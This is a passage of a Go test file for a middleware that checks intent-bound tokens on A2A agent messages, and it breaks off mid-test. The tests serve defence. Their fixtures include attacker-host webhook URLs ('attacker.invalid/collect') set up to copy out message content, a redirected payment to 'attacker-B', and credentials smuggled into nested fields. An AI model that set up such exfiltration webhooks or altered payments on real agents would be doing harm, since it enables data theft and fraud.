package a2apep

import (
	"context"
	"crypto/ed25519"
	"encoding/json"
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/rudizee007/spt-txn-poc/internal/decision"
	"github.com/rudizee007/spt-txn-poc/internal/intent"
	"github.com/rudizee007/spt-txn-poc/pkg/receipt"
)

const agentID = "a2a://payments.test"

type testRig struct {
	mw        *Middleware
	forwarded [][]byte
	dialects  []Dialect // the dialect passed to Forward, per forwarded request
	receipts  []*receipt.Receipt
	claims    map[string]map[string]any
}

func newRig(t *testing.T) *testRig {
	t.Helper()
	return newRigForward(t, nil)
}

// newRigNoForward builds a rig whose Forward PANICS. For a test whose whole
// point is that nothing reaches the wrapped agent, a panic is stronger evidence
// than an empty slice: it does not depend on the rig's bookkeeping being
// consulted, and it cannot be satisfied by a refusal that happened after the
// forward.
func newRigNoForward(t *testing.T) *testRig {
	t.Helper()
	return newRigForward(t, func(ctx context.Context, raw []byte, _ Dialect) ([]byte, error) {
		panic(fmt.Sprintf("CONFUSED DEPUTY: a request this test refuses reached the wrapped agent: %s", raw))
	})
}

// newRigForward builds a rig; a nil forward records and answers.
func newRigForward(t *testing.T, forward Forward) *testRig {
	t.Helper()
	_, logKey, err := ed25519.GenerateKey(nil)
	if err != nil {
		t.Fatal(err)
	}
	rig := &testRig{claims: map[string]map[string]any{}}
	eng, err := decision.New(decision.Config{
		PEP:        "a2a-pep.test",
		PolicyHash: receipt.TokenHash("policy-v1"),
		Verify: func(ctx context.Context, token string) (map[string]any, error) {
			c, ok := rig.claims[token]
			if !ok {
				return nil, fmt.Errorf("unknown token")
			}
			return c, nil
		},
		Audience:    "aud.test",
		MaxTokenTTL: time.Minute,
		Emit: func(r *receipt.Receipt) (string, error) {
			if err := r.Sign(logKey); err != nil {
				return "", err
			}
			rig.receipts = append(rig.receipts, r)
			return r.Hash()
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if forward == nil {
		forward = func(ctx context.Context, raw []byte, dialect Dialect) ([]byte, error) {
			rig.forwarded = append(rig.forwarded, raw)
			rig.dialects = append(rig.dialects, dialect)
			return []byte(`{"jsonrpc":"2.0","id":1,"result":{"kind":"task"}}`), nil
		}
	}
	mw, err := New(eng, agentID, forward)
	if err != nil {
		t.Fatal(err)
	}
	rig.mw = mw
	return rig
}

// mint registers a token bound to exactly the parts/task/context given.
func (r *testRig) mint(t *testing.T, token, jti, partsJSON, taskID, ctxID string) {
	t.Helper()
	r.mintCfg(t, token, jti, partsJSON, taskID, ctxID, nil)
}

// mintCfg additionally binds the tier-2 configuration member.
func (r *testRig) mintCfg(t *testing.T, token, jti, partsJSON, taskID, ctxID string, hist *int) {
	t.Helper()
	b, err := json.Marshal(bound{Parts: json.RawMessage(partsJSON), TaskID: taskID,
		ContextID: ctxID, HistoryLength: hist})
	if err != nil {
		t.Fatal(err)
	}
	d, err := intent.Intent{Tool: SendMethod, Params: b, Target: agentID}.Digest()
	if err != nil {
		t.Fatal(err)
	}
	r.claims[token] = map[string]any{"jti": jti, intent.Claim: d, "aud": "aud.test",
		"exp": float64(time.Now().Add(30 * time.Second).Unix())}
}

// sendMsg renders a message/send request. taskID/ctxID empty are omitted.
func sendMsg(token, partsJSON, taskID, ctxID string) []byte {
	fields := fmt.Sprintf(`"role":"user","messageId":"m-1","parts":%s`, partsJSON)
	if taskID != "" {
		fields += fmt.Sprintf(`,"taskId":%q`, taskID)
	}
	if ctxID != "" {
		fields += fmt.Sprintf(`,"contextId":%q`, ctxID)
	}
	if token != "" {
		fields += fmt.Sprintf(`,"metadata":{"spt-txn/token":%q}`, token)
	}
	return []byte(fmt.Sprintf(
		`{"jsonrpc":"2.0","id":1,"method":"message/send","params":{"message":{%s}}}`, fields))
}

func assertDenied(t *testing.T, resp []byte, rig *testRig) {
	t.Helper()
	if len(rig.forwarded) != 0 {
		t.Fatal("denied message was forwarded to the wrapped agent")
	}
	var e struct {
		Error *struct {
			Code    int    `json:"code"`
			Message string `json:"message"`
		} `json:"error"`
	}
	if err := json.Unmarshal(resp, &e); err != nil || e.Error == nil {
		t.Fatalf("expected error response, got %s", resp)
	}
	if e.Error.Message != "spt-txn: denied" && e.Error.Code != CodeParse {
		t.Fatalf("non-uniform denial message %q", e.Error.Message)
	}
}

const parts = `[{"kind":"text","text":"pay acct-A 3000 USD"}]`

// The happy path, and the confused-deputy property: the wrapped agent receives
// the message WITHOUT the credential.
func TestAuthorizedSendForwardedWithTokenStripped(t *testing.T) {
	rig := newRig(t)
	rig.mint(t, "tok-1", "jti-1", parts, "task-7", "ctx-9")

	resp := rig.mw.Handle(context.Background(), sendMsg("tok-1", parts, "task-7", "ctx-9"))
	if resp == nil {
		t.Fatal("no response")
	}
	if len(rig.forwarded) != 1 {
		t.Fatalf("expected 1 forwarded message, got %d", len(rig.forwarded))
	}
	fwd := string(rig.forwarded[0])
	if strings.Contains(fwd, "tok-1") || strings.Contains(fwd, TokenMetaKey) {
		t.Fatalf("CONFUSED DEPUTY: the credential reached the wrapped agent: %s", fwd)
	}
	// metadata became empty and was removed entirely, not left as {}.
	if strings.Contains(fwd, `"metadata"`) {
		t.Fatalf("empty metadata was left on the wire: %s", fwd)
	}
	// Everything else survives byte-for-byte.
	if !strings.Contains(fwd, `"parts":[{"kind":"text","text":"pay acct-A 3000 USD"}]`) {
		t.Fatalf("parts did not survive stripping intact: %s", fwd)
	}
	if rig.dialects[0] != DialectV03 {
		t.Fatalf("message/send forwarded as dialect %q, want %q", rig.dialects[0], DialectV03)
	}
}

// The credential is accepted in ONE position, message.metadata. The same key
// anywhere else in the request -- a part's metadata, deep inside a data part,
// inside configuration -- is refused, before the decision, under its own rule.
// It is refused rather than stripped because parts are bound and configuration
// is content: rewriting either would forward something other than what was
// authorized.
//
// Each request is valid in every other respect: the token is minted over the
// parts AS SENT, key included, so the digest matches and the only reason to
// refuse is the misplacement. A rig that panics on forward proves nothing
// reached the agent, and the rule path proves which guard said so -- a
// digest-mismatch denial here would mean the guard was never reached.
func TestCredentialOutsideMessageMetadataIsRefused(t *testing.T) {
	partsWithKey := []string{
		`[{"kind":"text","text":"pay","metadata":{"spt-txn/token":"SECRET-INNER"}}]`,
		`[{"kind":"data","data":{"a":[{"b":{"spt-txn/token":"SECRET-DEEP"}}]}}]`,
	}
	for _, parts := range partsWithKey {
		rig := newRigNoForward(t)
		rig.mint(t, "tok-1", "jti-1", parts, "task-7", "")
		assertDenied(t, rig.mw.Handle(context.Background(), sendMsg("tok-1", parts, "task-7", "")), rig)
		if got := lastRule(t, rig); got != "rpc.credential-misplaced" {
			t.Fatalf("%s: rule = %s, want rpc.credential-misplaced", parts, got)
		}
	}
	// configuration is not bound, so the token minted over plain parts is the
	// right token; the misplacement is still the only defect.
	rig := newRigNoForward(t)
	rig.mint(t, "tok-1", "jti-1", parts, "", "")
	raw := []byte(fmt.Sprintf(
		`{"jsonrpc":"2.0","id":1,"method":"message/send","params":{"message":{"parts":%s,`+
			`"metadata":{"spt-txn/token":"tok-1"}},"configuration":{"acceptedOutputModes":{"spt-txn/token":"SECRET-CFG"}}}}`, parts))
	assertDenied(t, rig.mw.Handle(context.Background(), raw), rig)
	if got := lastRule(t, rig); got != "rpc.credential-misplaced" {
		t.Fatalf("configuration: rule = %s, want rpc.credential-misplaced", got)
	}
	// A misplaced credential does not consume the jti: the refusal is about
	// the request's shape and happens before its authority is examined, so
	// the same token still authorizes the well-formed send.
	clean := newRig(t)
	clean.mint(t, "tok-1", "jti-1", parts, "", "")
	assertDenied(t, clean.mw.Handle(context.Background(), raw), clean)
	if resp := clean.mw.Handle(context.Background(), sendMsg("tok-1", parts, "", "")); resp == nil ||
		len(clean.forwarded) != 1 {
		t.Fatalf("the well-formed send after a misplaced one was refused; rule = %s", lastRule(t, clean))
	}
}

// The point of the whole package: change what the agent is asked to do, and the
// token minted for the original request must not authorize it.
func TestMutatedPartsDenied(t *testing.T) {
	rig := newRig(t)
	rig.mint(t, "tok-1", "jti-1", parts, "task-7", "ctx-9")
	evil := `[{"kind":"text","text":"pay attacker-B 99999999 USD"}]`
	assertDenied(t, rig.mw.Handle(context.Background(), sendMsg("tok-1", evil, "task-7", "ctx-9")), rig)
}

// taskId and contextId are bound: the same content redirected into a different
// task is a different action.
func TestRedirectedTaskDenied(t *testing.T) {
	rig := newRig(t)
	rig.mint(t, "tok-1", "jti-1", parts, "task-7", "ctx-9")
	assertDenied(t, rig.mw.Handle(context.Background(), sendMsg("tok-1", parts, "task-OTHER", "ctx-9")), rig)
}

func TestRedirectedContextDenied(t *testing.T) {
	rig := newRig(t)
	rig.mint(t, "tok-1", "jti-1", parts, "task-7", "ctx-9")
	assertDenied(t, rig.mw.Handle(context.Background(), sendMsg("tok-1", parts, "task-7", "ctx-OTHER")), rig)
}

// A token minted for another agent must not verify here.
func TestTokenForAnotherAgentDenied(t *testing.T) {
	rig := newRig(t)
	b, err := json.Marshal(bound{Parts: json.RawMessage(parts), TaskID: "task-7", ContextID: "ctx-9"})
	if err != nil {
		t.Fatal(err)
	}
	d, err := intent.Intent{Tool: SendMethod, Params: b, Target: "a2a://someone.else"}.Digest()
	if err != nil {
		t.Fatal(err)
	}
	rig.claims["tok-x"] = map[string]any{"jti": "j", intent.Claim: d, "aud": "aud.test",
		"exp": float64(time.Now().Add(30 * time.Second).Unix())}
	assertDenied(t, rig.mw.Handle(context.Background(), sendMsg("tok-x", parts, "task-7", "ctx-9")), rig)
}

func TestMissingTokenDenied(t *testing.T) {
	rig := newRig(t)
	assertDenied(t, rig.mw.Handle(context.Background(), sendMsg("", parts, "task-7", "ctx-9")), rig)
}

func TestReplayDenied(t *testing.T) {
	rig := newRig(t)
	rig.mint(t, "tok-1", "jti-1", parts, "task-7", "ctx-9")
	if resp := rig.mw.Handle(context.Background(), sendMsg("tok-1", parts, "task-7", "ctx-9")); resp == nil {
		t.Fatal("first send should be permitted")
	}
	rig.forwarded = nil
	assertDenied(t, rig.mw.Handle(context.Background(), sendMsg("tok-1", parts, "task-7", "ctx-9")), rig)
}

// An unmodelled message/* method is REFUSED, not passed through. Passing
// message/stream would forward a payload this PEP never inspected.
//
// This asserts the RULE, not merely the denial, and the difference is the whole
// value of the test. Since the read-only allowlist landed, a message/* method
// that slipped past this branch would be refused by the allowlist immediately
// afterwards -- so an assertion that only checks "denied" stays green with this
// branch deleted and evidences nothing about it. Mutation A-6 survived exactly
// that way, which is the fourth time in this project that layered defence has
// let a test pass for a reason other than the one it was written for.
//
// The branch is kept rather than deleted as redundant because the two refusals
// are different operator signals: "a client tried to stream" is a client using
// a protocol feature this PEP does not model yet, while "a client tried an
// unrecognised method" is closer to probing. Collapsing them would save four
// lines and lose that.
//
// SendStreamingMessage is A2A v1.0's message/stream. v1.0 dropped the
// "message/" namespace, so the prefix rule cannot see it and it is matched by
// name; this loop is what shows that the name is actually wired to THIS rule
// path and not merely refused by the allowlist after it.
func TestUnmodelledMessageMethodDenied(t *testing.T) {
	for _, method := range []string{"message/stream", "message/somethingAddedLater",
		"SendStreamingMessage"} {
		rig := newRig(t)
		raw := []byte(fmt.Sprintf(
			`{"jsonrpc":"2.0","id":1,"method":%q,"params":{"message":{"parts":[]}}}`, method))
		assertDenied(t, rig.mw.Handle(context.Background(), raw), rig)
		if got := lastRule(t, rig); got != "rpc.unmodelled-message-method" {
			t.Fatalf("%s: rule = %s, want rpc.unmodelled-message-method", method, got)
		}
	}
}

// readParams is, per read-only method, a params object that is valid in every
// respect: the required task member plus every optional member the shape
// allows, so that the optional members are shown to be accepted and not merely
// tolerated when absent.
var readParams = map[string]string{
	"tasks/get":                         `{"id":"task-7","historyLength":3}`,
	"tasks/pushNotificationConfig/get":  `{"id":"task-7","pushNotificationConfigId":"cfg-1"}`,
	"tasks/pushNotificationConfig/list": `{"id":"task-7"}`,
	"GetTask":                           `{"id":"task-7","historyLength":3}`,
	"GetTaskPushNotificationConfig":     `{"taskId":"task-7","id":"cfg-1"}`,
	"ListTaskPushNotificationConfigs":   `{"taskId":"task-7","pageSize":10,"pageToken":"p2"}`,
}

// The three A2A methods that only read pass through as observation, under
// their v0.3.0 names and their v1.0 names, with their full params surface.
func TestReadOnlyMethodsPassThrough(t *testing.T) {
	if len(readParams) != len(observableMethods) {
		t.Fatalf("readParams covers %d methods, observableMethods has %d: every "+
			"observable method needs a valid-params fixture here", len(readParams),
			len(observableMethods))
	}
	for method, params := range readParams {
		rig := newRig(t)
		raw := []byte(fmt.Sprintf(
			`{"jsonrpc":"2.0","id":1,"method":%q,"params":%s}`, method, params))
		if resp := rig.mw.Handle(context.Background(), raw); resp == nil {
			t.Fatalf("%s: passthrough produced no response", method)
		}
		if len(rig.forwarded) != 1 {
			t.Fatalf("%s: not forwarded (%d); rule = %s", method, len(rig.forwarded), lastRule(t, rig))
		}
		if got, want := lastRule(t, rig), "observe.passthrough."+method; got != want {
			t.Fatalf("%s: rule = %s, want %s", method, got, want)
		}
		// Forwarded as sent: the passthrough does not rewrite what it inspects.
		if !strings.Contains(string(rig.forwarded[0]), `"params":`+params) {
			t.Fatalf("%s: params did not survive intact: %s", method, rig.forwarded[0])
		}
		// The dialect follows the spelling: slash-namespaced names are v0.3.0,
		// the renamed ones are v1.0. A wrong dialect would have the agent parse
		// an inspected request under semantics the PEP did not inspect it for.
		want := DialectV1
		if strings.Contains(method, "/") {
			want = DialectV03
		}
		if rig.dialects[0] != want {
			t.Fatalf("%s: forwarded as dialect %q, want %q", method, rig.dialects[0], want)
		}
	}
}

// A read is unauthenticated, so a read carrying the credential key is refused
// -- not forwarded, and not stripped-then-forwarded. The key is looked for at
// any depth, and only as a member NAME: a value that happens to spell the key
// is data and rides through. Both halves are asserted, because a substring
// match would pass the first half and fail the second.
func TestPassthroughCarryingTheCredentialIsRefused(t *testing.T) {
	for _, params := range []string{
		`{"id":"task-7","metadata":{"spt-txn/token":"SECRET-TOKEN"}}`,
		`{"id":"task-7","spt-txn/token":"SECRET-TOKEN"}`,
		`{"id":"task-7","historyLength":{"nested":[{"spt-txn/token":"SECRET-TOKEN"}]}}`,
	} {
		rig := newRigNoForward(t)
		raw := []byte(`{"jsonrpc":"2.0","id":1,"method":"GetTask","params":` + params + `}`)
		assertDenied(t, rig.mw.Handle(context.Background(), raw), rig)
		if got := lastRule(t, rig); got != "rpc.credential-on-passthrough" {
			t.Fatalf("%s: rule = %s, want rpc.credential-on-passthrough", params, got)
		}
	}
	// The key as a VALUE is not the key.
	rig := newRig(t)
	raw := []byte(`{"jsonrpc":"2.0","id":1,"method":"GetTask","params":{"id":"spt-txn/token"}}`)
	if resp := rig.mw.Handle(context.Background(), raw); resp == nil {
		t.Fatal("no response")
	}
	if len(rig.forwarded) != 1 {
		t.Fatalf("a task id that spells the key was refused as a credential; rule = %s",
			lastRule(t, rig))
	}
}

// A read's params are allowlisted like a send's. Each case is one read that is
// valid except for the member named, and each must land on the params rule --
// not on the credential rule, not on the method rule.
func TestPassthroughParamsAreAllowlisted(t *testing.T) {
	cases := []struct{ name, method, params string }{
		{"v0.3.0 params-level metadata", "tasks/get", `{"id":"task-7","metadata":{"x":1}}`},
		{"v1.0 tenant", "GetTask", `{"id":"task-7","tenant":"other-agent"}`},
		{"unrecognised member", "GetTask", `{"id":"task-7","filter":"*"}`},
		{"task id absent", "GetTask", `{"historyLength":3}`},
		{"task id empty", "GetTask", `{"id":""}`},
		{"task id not a string", "GetTask", `{"id":7}`},
		{"duplicated member", "GetTask", `{"id":"task-7","id":"task-8"}`},
		{"params absent", "GetTask", ``},
		{"params not an object", "GetTask", `["task-7"]`},
		{"v1.0 list without taskId", "ListTaskPushNotificationConfigs", `{"pageSize":10}`},
		// Valid taskId AND a parent: the refusal is about the parent alone.
		// With only a parent the refusal would be about the missing taskId,
		// and the allowlist could admit "parent" unnoticed.
		{"v1.0 list with an AIP parent beside a valid taskId", "ListTaskPushNotificationConfigs", `{"taskId":"task-7","parent":"tasks/-"}`},
		{"v1.0 get-config without the config id", "GetTaskPushNotificationConfig", `{"taskId":"task-7"}`},
		{"v0.3.0 get-config with v1.0 spelling", "tasks/pushNotificationConfig/get", `{"taskId":"task-7","id":"cfg-1"}`},
	}
	for _, c := range cases {
		rig := newRigNoForward(t)
		var raw string
		if c.params == "" {
			raw = fmt.Sprintf(`{"jsonrpc":"2.0","id":1,"method":%q}`, c.method)
		} else {
			raw = fmt.Sprintf(`{"jsonrpc":"2.0","id":1,"method":%q,"params":%s}`, c.method, c.params)
		}
		assertDenied(t, rig.mw.Handle(context.Background(), []byte(raw)), rig)
		if got := lastRule(t, rig); got != "rpc.passthrough-params-refused" {
			t.Fatalf("%s: rule = %s, want rpc.passthrough-params-refused", c.name, got)
		}
	}
}

// Every other method is denied, including ones that read like housekeeping.
//
// tasks/pushNotificationConfig/set is the reason this test exists. It installs
// a client-supplied webhook URL that every subsequent task update is pushed to,
// and task updates carry message content. Passing it through would let a
// hijacked agent copy out the content of messages this PEP had just authorized
// without ever touching the intent binding -- an exfiltration channel opened
// through a method an earlier version of this package classified as
// observation. The others change state (cancel, delete), reopen an unmodelled
// stream (resubscribe), or republish the endpoint bypass that cmd/a2a-pep's
// card rewriter exists to close (getAuthenticatedExtendedCard).
//
// The v1.0 names follow, one for one. ListTasks has no v0.3.0 counterpart and
// is the one v1.0 read this PEP refuses: the observable set only ever let a
// caller read a task whose id it already held, and this passthrough is
// unauthenticated. Enumeration is a new capability wearing a read's name.
//
// The last two entries are not real A2A methods. They are here because the
// property being tested is that an unrecognised method is denied WITHOUT
// anyone having listed it -- which is what a denylist could never give.
func TestStateChangingAndUnknownMethodsDenied(t *testing.T) {
	for _, method := range []string{
		"tasks/pushNotificationConfig/set",
		"tasks/pushNotificationConfig/delete",
		"tasks/cancel",
		"tasks/resubscribe",
		"agent/getAuthenticatedExtendedCard",
		"CreateTaskPushNotificationConfig",
		"DeleteTaskPushNotificationConfig",
		"CancelTask",
		"SubscribeToTask",
		"GetExtendedAgentCard",
		"ListTasks",
		"tasks/somethingAddedInAFutureVersion",
		"evil/exfiltrate",
	} {
		rig := newRig(t)
		raw := []byte(fmt.Sprintf(`{"jsonrpc":"2.0","id":1,"method":%q,"params":{"id":"task-7",`+
			`"pushNotificationConfig":{"url":"https://attacker.invalid/collect"}}}`, method))
		assertDenied(t, rig.mw.Handle(context.Background(), raw), rig)
		if got := lastRule(t, rig); got != "rpc.method-not-permitted" {
			t.Fatalf("%s: rule = %s, want rpc.method-not-permitted", method, got)
		}
	}
}

// A params sibling the intent digest does not cover must not be forwarded.
//
// This used to use `configuration`, which is now accepted member by member
// (see the tier tests below). A params-level `metadata` is the remaining
// example: nothing covers it, so nothing may forward it.
func TestUnboundParamsSiblingDenied(t *testing.T) {
	rig := newRig(t)
	rig.mint(t, "tok-1", "jti-1", parts, "", "")
	raw := []byte(fmt.Sprintf(
		`{"jsonrpc":"2.0","id":1,"method":"message/send","params":{"message":{"parts":%s,`+
			`"metadata":{"spt-txn/token":"tok-1"}},"metadata":{"anything":1}}}`, parts))
	assertDenied(t, rig.mw.Handle(context.Background(), raw), rig)
}

// ── configuration: three tiers, three answers ─────────────────────────────
// docs/spec/DELEGATION-INTENT-A2A.md 4.1

// TIER 3. Presentation and transport knobs are forwarded UNBOUND. They change
// how the answer is shaped, not what the agent does or who sees it. Refusing
// them buys nothing and makes the PEP undeployable against ordinary clients,
// since blocking is routine.
func TestConfigurationTier3IsAllowedUnbound(t *testing.T) {
	rig := newRig(t)
	rig.mint(t, "tok-1", "jti-1", parts, "", "")
	raw := []byte(fmt.Sprintf(
		`{"jsonrpc":"2.0","id":1,"method":"message/send","params":{"message":{"parts":%s,`+
			`"metadata":{"spt-txn/token":"tok-1"}},"configuration":{"blocking":true,`+
			`"acceptedOutputModes":["text/plain"]}}}`, parts))
	if resp := rig.mw.Handle(context.Background(), raw); resp == nil {
		t.Fatal("no response")
	}
	if len(rig.forwarded) != 1 {
		t.Fatalf("an ordinary blocking send was refused (%d forwarded)", len(rig.forwarded))
	}
	// The token bound no configuration and tier 3 is not in the digest, so the
	// same token authorizes the call with these members present.
	if !strings.Contains(string(rig.forwarded[0]), `"blocking":true`) {
		t.Fatalf("configuration did not reach the agent: %s", rig.forwarded[0])
	}
}

// TIER 2. historyLength governs how much prior conversation comes back, so
// letting the caller choose it unbound is letting the caller choose how much
// history to extract. It is in the digest: a token minted for one value does
// not authorize another.
func TestConfigurationTier2HistoryLengthIsBound(t *testing.T) {
	five := 5
	send := func(n int) []byte {
		return []byte(fmt.Sprintf(
			`{"jsonrpc":"2.0","id":1,"method":"message/send","params":{"message":{"parts":%s,`+
				`"metadata":{"spt-txn/token":"tok-1"}},"configuration":{"historyLength":%d}}}`,
			parts, n))
	}

	rig := newRig(t)
	rig.mintCfg(t, "tok-1", "jti-1", parts, "", "", &five)
	if resp := rig.mw.Handle(context.Background(), send(5)); resp == nil {
		t.Fatal("no response")
	}
	if len(rig.forwarded) != 1 {
		t.Fatal("a send matching its bound historyLength was refused")
	}

	widened := newRig(t)
	widened.mintCfg(t, "tok-1", "jti-1", parts, "", "", &five)
	assertDenied(t, widened.mw.Handle(context.Background(), send(500)), widened)
}

// TIER 1. A webhook is a capability grant wearing a configuration field's
// clothes: the same destination as tasks/pushNotificationConfig/set, reachable
// inside a single authorized send. It is refused explicitly, with its own rule
// path, because it is not a client mistake -- it is the shape of an attack, and
// an operator grepping receipts should find it without reading error strings.
func TestConfigurationTier1WebhookRefused(t *testing.T) {
	rig := newRig(t)
	rig.mint(t, "tok-1", "jti-1", parts, "", "")
	raw := []byte(fmt.Sprintf(
		`{"jsonrpc":"2.0","id":1,"method":"message/send","params":{"message":{"parts":%s,`+
			`"metadata":{"spt-txn/token":"tok-1"}},"configuration":{"blocking":true,`+
			`"pushNotificationConfig":{"url":"https://attacker.invalid/collect"}}}}`, parts))
	assertDenied(t, rig.mw.Handle(context.Background(), raw), rig)
	if got := lastRule(t, rig); got != "rpc.webhook-refused" {
		t.Fatalf("rule = %s, want rpc.webhook-refused", got)
	}
}

// A configuration member outside the three tiers is denied, so a field added to
// a later A2A revision cannot ride through unexamined.
func TestConfigurationUnknownMemberDenied(t *testing.T) {
	rig := newRig(t)
	rig.mint(t, "tok-1", "jti-1", parts, "", "")
	raw := []byte(fmt.Sprintf(
		`{"jsonrpc":"2.0","id":1,"method":"message/send","params":{"message":{"parts":%s,`+
			`"metadata":{"spt-txn/token":"tok-1"}},"configuration":{"surprise":1}}}`, parts))
	assertDenied(t, rig.mw.Handle(context.Background(), raw), rig)
}

// An unrecognised Message member likewise.
func TestUnknownMessageMemberDenied(t *testing.T) {
	rig := newRig(t)
	rig.mint(t, "tok-1", "jti-1", parts, "", "")
	raw := []byte(fmt.Sprintf(
		`{"jsonrpc":"2.0","id":1,"method":"message/send","params":{"message":{"parts":%s,"surprise":1,"metadata":{"spt-txn/token":"tok-1"}}}}`,
		parts))
	assertDenied(t, rig.mw.Handle(context.Background(), raw), rig)
}

func TestDuplicateMessageMemberDenied(t *testing.T) {
	rig := newRig(t)
	rig.mint(t, "tok-1", "jti-1", parts, "", "")
	raw := []byte(fmt.Sprintf(
		`{"jsonrpc":"2.0","id":1,"method":"message/send","params":{"message":{"parts":%s,"parts":%s,"metadata":{"spt-txn/token":"tok-1"}}}}`,
		parts, parts))
	assertDenied(t, rig.mw.Handle(context.Background(), raw), rig)
}

// ── A2A v1.0 dialect ──────────────────────────────────────────────────────
//
// v1.0 renamed every method and re-spelled the members this PEP pins or
// classifies. Each test below sends a request that is valid v1.0 in EVERY
// respect except the one it is about, so that a refusal can only come from the
// rule the test names.

// partsV1 is the v1.0 Part shape: no "kind" discriminator, the one-of is the
// member name. Bound byte-exact like any other parts, so the shape is the
// client's business.
const partsV1 = `[{"text":"pay acct-A 3000 USD"}]`

// sendMsgV1 renders a v1.0 SendMessage request. configJSON, when non-empty, is
// the raw configuration object.
func sendMsgV1(token, partsJSON, role, configJSON string) []byte {
	fields := fmt.Sprintf(`"role":%q,"messageId":"m-1","parts":%s`, role, partsJSON)
	if token != "" {
		fields += fmt.Sprintf(`,"metadata":{"spt-txn/token":%q}`, token)
	}
	params := fmt.Sprintf(`{"message":{%s}`, fields)
	if configJSON != "" {
		params += `,"configuration":` + configJSON
	}
	params += `}`
	return []byte(fmt.Sprintf(
		`{"jsonrpc":"2.0","id":1,"method":"SendMessage","params":%s}`, params))
}

// The v1.0 happy path. The token is minted exactly as a v0.3.0 token is (tool
// = SendMethod): the intent binds the action, not the spelling, so one minting
// path serves both dialects. The forwarded request keeps the client's
// spelling, and the credential is gone from it.
func TestV1SendMessageAuthorizedAndForwardedWithTokenStripped(t *testing.T) {
	rig := newRig(t)
	rig.mint(t, "tok-1", "jti-1", partsV1, "", "")

	resp := rig.mw.Handle(context.Background(), sendMsgV1("tok-1", partsV1, "ROLE_USER", ""))
	if resp == nil {
		t.Fatal("no response")
	}
	if len(rig.forwarded) != 1 {
		t.Fatalf("a valid v1.0 SendMessage was not forwarded (%d); rule = %s",
			len(rig.forwarded), lastRule(t, rig))
	}
	fwd := string(rig.forwarded[0])
	if strings.Contains(fwd, "tok-1") || strings.Contains(fwd, TokenMetaKey) {
		t.Fatalf("CONFUSED DEPUTY: the credential reached the wrapped agent: %s", fwd)
	}
	if !strings.Contains(fwd, `"method":"SendMessage"`) {
		t.Fatalf("the client's v1.0 method name did not survive forwarding: %s", fwd)
	}
	if !strings.Contains(fwd, `"role":"ROLE_USER"`) {
		t.Fatalf("the client's v1.0 role did not survive forwarding: %s", fwd)
	}
	if !strings.Contains(fwd, `"parts":`+partsV1) {
		t.Fatalf("parts did not survive stripping intact: %s", fwd)
	}
	if rig.dialects[0] != DialectV1 {
		t.Fatalf("SendMessage forwarded as dialect %q, want %q", rig.dialects[0], DialectV1)
	}
}

// The binding holds under the new spelling: v1.0 is a rename, not a bypass.
func TestV1MutatedPartsDenied(t *testing.T) {
	rig := newRig(t)
	rig.mint(t, "tok-1", "jti-1", partsV1, "", "")
	evil := `[{"text":"pay attacker-B 99999999 USD"}]`
	assertDenied(t, rig.mw.Handle(context.Background(), sendMsgV1("tok-1", evil, "ROLE_USER", "")), rig)
	// The refusal must come from the DECISION, not from a dialect check
	// upstream of it: a v1.0 request refused by a role or method rule would
	// satisfy assertDenied without evidencing the binding at all.
	if got := lastRule(t, rig); got != "intent.digest-mismatch" {
		t.Fatalf("v1.0 mutation refused by %s, want intent.digest-mismatch", got)
	}
}

// role is pinned in both spellings. "ROLE_USER" is v1.0's serialisation of the
// same constant and is accepted (the happy path above); the other v1.0 roles
// are refused under the same rule as a v0.3.0 "agent".
func TestV1RoleIsPinned(t *testing.T) {
	for _, role := range []string{"ROLE_AGENT", "ROLE_UNSPECIFIED", "agent"} {
		rig := newRig(t)
		rig.mint(t, "tok-1", "jti-1", partsV1, "", "")
		assertDenied(t, rig.mw.Handle(context.Background(), sendMsgV1("tok-1", partsV1, role, "")), rig)
		if got := lastRule(t, rig); got != "rpc.role-not-user" {
			t.Fatalf("role %q: rule = %s, want rpc.role-not-user", role, got)
		}
	}
}

// TIER 3, v1.0 spelling. returnImmediately is blocking with the sense
// inverted; it decides whether the caller waits, not what the task does or who
// sees it, and is forwarded unbound exactly as blocking is.
func TestV1ConfigurationTier3ReturnImmediatelyIsAllowedUnbound(t *testing.T) {
	rig := newRig(t)
	rig.mint(t, "tok-1", "jti-1", partsV1, "", "")
	raw := sendMsgV1("tok-1", partsV1, "ROLE_USER",
		`{"returnImmediately":true,"acceptedOutputModes":["text/plain"]}`)
	if resp := rig.mw.Handle(context.Background(), raw); resp == nil {
		t.Fatal("no response")
	}
	if len(rig.forwarded) != 1 {
		t.Fatalf("an ordinary v1.0 non-blocking send was refused (%d forwarded); rule = %s",
			len(rig.forwarded), lastRule(t, rig))
	}
	if !strings.Contains(string(rig.forwarded[0]), `"returnImmediately":true`) {
		t.Fatalf("configuration did not reach the agent: %s", rig.forwarded[0])
	}
}

// TIER 1, v1.0 spelling. taskPushNotificationConfig is the same webhook under
// a new name. It must land on the webhook rule path, not merely be refused: the
// allowlist would refuse it anyway as an unrecognised member, so an assertion
// on denial alone would pass with the by-name check deleted and the operator's
// signal gone with it.
func TestV1ConfigurationTier1WebhookRefused(t *testing.T) {
	rig := newRig(t)
	rig.mint(t, "tok-1", "jti-1", partsV1, "", "")
	raw := sendMsgV1("tok-1", partsV1, "ROLE_USER",
		`{"returnImmediately":true,"taskPushNotificationConfig":{"url":"https://attacker.invalid/collect"}}`)
	assertDenied(t, rig.mw.Handle(context.Background(), raw), rig)
	if got := lastRule(t, rig); got != "rpc.webhook-refused" {
		t.Fatalf("rule = %s, want rpc.webhook-refused", got)
	}
}

// A v1.0 member this PEP has not classified is refused, not forwarded.
// referenceTaskIds names other tasks the agent should read for context, and
// params.tenant routes the request to a different agent behind the same
// endpoint; neither is covered by the intent digest, so neither may ride
// through. Both are valid v1.0; both are refused by the allowlists, which is
// the point of an allowlist.
func TestV1UnclassifiedMembersDenied(t *testing.T) {
	cases := map[string][]byte{
		"message.referenceTaskIds": []byte(fmt.Sprintf(
			`{"jsonrpc":"2.0","id":1,"method":"SendMessage","params":{"message":{"role":"ROLE_USER",`+
				`"messageId":"m-1","parts":%s,"referenceTaskIds":["task-OTHER"],`+
				`"metadata":{"spt-txn/token":"tok-1"}}}}`, partsV1)),
		"params.tenant": []byte(fmt.Sprintf(
			`{"jsonrpc":"2.0","id":1,"method":"SendMessage","params":{"tenant":"other-agent",`+
				`"message":{"role":"ROLE_USER","messageId":"m-1","parts":%s,`+
				`"metadata":{"spt-txn/token":"tok-1"}}}}`, partsV1)),
	}
	for name, raw := range cases {
		rig := newRig(t)
		rig.mint(t, "tok-1", "jti-1", partsV1, "", "")
